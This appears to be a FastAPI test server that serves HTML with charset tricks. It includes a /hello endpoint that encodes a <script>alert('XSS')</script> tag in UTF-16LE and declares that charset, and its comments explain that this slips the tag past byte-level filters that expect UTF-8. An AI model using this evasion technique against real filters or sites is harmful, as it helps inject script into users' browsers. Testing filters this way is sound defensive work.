import random
from enum import Enum

from fastapi import FastAPI, Response
from fastapi.responses import HTMLResponse

app = FastAPI()


class Utf8Type(Enum):
    ONE_BYTE = 1
    TWO_BYTE = 2
    THREE_BYTE = 3
    FOUR_BYTE = 4


class Utf8Generator:
    """Generates random characters whose UTF-8 encoding is a fixed byte length."""

    _RANGES = {
        Utf8Type.ONE_BYTE: [(0x0000, 0x007F)],
        Utf8Type.TWO_BYTE: [(0x0080, 0x07FF)],
        # 0xD800-0xDFFF are surrogate code points and cannot be encoded in UTF-8
        Utf8Type.THREE_BYTE: [(0x0800, 0xD7FF), (0xE000, 0xFFFF)],
        Utf8Type.FOUR_BYTE: [(0x10000, 0x10FFFF)],
    }

    def __init__(self, size: int, type: Utf8Type):
        self.size = size
        self.type = type

    def generate(self) -> str:
        ranges = self._RANGES[self.type]
        chars = []
        for _ in range(self.size):
            lo, hi = random.choice(ranges)
            chars.append(chr(random.randint(lo, hi)))
        return "".join(chars)

# HELLO_BODY = (
#     "<!DOCTYPE html>"
#     "<html>"
#     "<head>"
#     "<meta charset=\"UTF-8\">"
#     "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=FAKE-CHARSET-999\">"
#     "<title>Testing Charset Failure</title>"
#     "</head>"
#     "<body>"
#     "<h1>Hello World</h1>"
#     "</body>"
#     "</html>"
# )

# HELLO_BOM = b"\x3c\x00\x3e\x00\x41"
# HELLO_BOM

@app.get("/hello")
def hello():
    one_byte = Utf8Generator(size=1000000, type=Utf8Type.ONE_BYTE).generate()
    two_byte = Utf8Generator(size=1000000, type=Utf8Type.TWO_BYTE).generate()
    three_byte = Utf8Generator(size=1000000, type=Utf8Type.THREE_BYTE).generate()
    # four_byte = Utf8Generator(size=100, type=Utf8Type.FOUR_BYTE).generate()
    # body =  one_byte.encode("utf-8") + two_byte.encode("utf-8") + three_byte.encode("utf-8") + four_byte.encode("utf-8")
    # body = four_byte.encode("utf-8")
    valid_part = b"""<!DOCTYPE html>
    <html>
    <head><title>Test</title></head>
    <body><p>Valid text to pass initial validation</p>"""
    
    # 2. Append an illegal, broken character sequence mid-stream
    # For EUC-JP / Shift_JIS, single control characters or unclosed leading bytes
    # will pass early structural parsing but fail deep structural translation.
    #
    # injected_tag is a real <script> element encoded as properly-paired UTF-16LE
    # code units (e.g. "<\x00s\x00c\x00..."). A byte-level filter expecting UTF-8/ASCII
    # won't see the contiguous substring b"<script", but once the response is decoded
    # per the declared charset=UTF-16LE header, it reconstructs into a live, parseable
    # <script> element. The trailing lone 0x41 is a dangling lead byte that re-desyncs
    # byte-pairing for everything after it (closing_part), reproducing the original
    # "breaks downstream parsing" behavior past the injected tag.
    injected_tag = "<script>alert('XSS')</script>".encode("utf-16le")
    broken_sequence = injected_tag + b"\x41"

    closing_part = b"</body></html>"
    
    payload = valid_part + broken_sequence + closing_part
    
    # 3. Use an accepted, recognized multi-byte charset syntax to pass the early checks
    return Response(
        content=payload,
        status_code=200,
        headers={"Content-Type": "text/html; charset=UTF-16LE"}
    )

@app.get("/")
def root():
    return {"status": "ok", "try": "/hello"}

# HELLO_BODY.encode("utf-8")